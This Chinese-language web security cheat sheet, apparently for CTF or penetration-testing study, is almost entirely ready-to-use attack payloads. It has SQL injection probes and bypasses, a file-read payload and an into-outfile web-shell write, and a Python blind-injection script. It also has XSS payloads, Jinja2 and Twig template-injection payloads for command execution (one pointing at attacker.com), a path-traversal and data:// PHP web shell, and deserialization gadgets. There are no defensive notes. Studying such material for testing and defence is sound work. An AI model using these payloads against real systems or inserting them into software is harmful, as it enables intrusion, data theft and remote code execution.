# Web 安全

## SQL 注入 (SQLi)

### 基础判断
- `'` 或 `"` 引发报错
- `and 1=1` / `and 1=2` 判断布尔盲注
- `sleep(5)` 判断时间盲注

### Union 注入
1. 确定字段数：`order by N` 或 `union select null,...,null`
2. 确定回显位置：`union select 1,2,3,...`
3. 获取数据库信息：
   - MySQL: `database()`, `version()`, `user()`
   - 表名：`information_schema.tables`
   - 列名：`information_schema.columns`

### 常用 Payload
- MySQL 读文件：`load_file('/etc/passwd')`
- MySQL 写文件：`into outfile '/var/www/shell.php'`
- 绕过空格：`/**/`、`%09`、`%0a`、`%0b`、`%0c`、`%0d`、`()` 
- 绕过关键字：大小写混合、编码、注释 `uni/**/on`

### 盲注脚本示例
```python
import requests
url = "http://target.com/vuln.php?id=1"
result = ""
for i in range(1, 100):
    for c in range(32, 127):
        payload = f"1' and ascii(substr((select database()),{i},1))={c}-- "
        if "正常响应" in requests.get(url+payload).text:
            result += chr(c)
            break
print(result)
```

## XSS (跨站脚本)

### 类型
- 反射型：URL 参数触发
- 存储型：数据存入数据库后触发
- DOM 型：前端 JavaScript 处理不当

### 绕过技巧
- 标签事件：`<img src=x onerror=alert(1)>`
- 编码绕过：HTML 实体、JS Unicode
- 过滤绕过：大小写、双写、注释

### 常用 Payload
- `<script>alert(1)</script>`
- `<svg onload=alert(1)>`
- `javascript:alert(1)`

## SSTI (服务端模板注入)

### Jinja2 (Python)
- 执行命令：`{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}`
- RCE: `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`

### Twig (PHP)
- `{{_self.env.setCache("ftp://attacker.com:2121")}}`
- `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

## 文件包含 (LFI/RFI)

### PHP 包含
- 本地文件包含：`?page=../../../../etc/passwd`
- 伪协议：
  - `php://filter/read=convert.base64-encode/resource=index.php`
  - `php://input` (需 allow_url_include=On)
  - `data://text/plain,<?php system($_GET['cmd']);?>`
  - `zip://`, `phar://`

### 绕过技巧
- 路径截断：`%00` (PHP < 5.3.4)
- 编码绕过：双 URL 编码、UTF-8

## 反序列化

### PHP
- 魔术方法：`__wakeup()`, `__destruct()`, `__toString()`
- 常用 gadget：`SimpleXMLElement`, `SoapClient`
- Phar 反序列化：`phar://test.phar`

### Python
- `__reduce__` 方法返回 `(callable, args)`
- RCE: `subprocess.check_output(['id'], shell=True)`

### Java
- Commons Collections, Spring, Fastjson
- ysoserial 工具生成 payload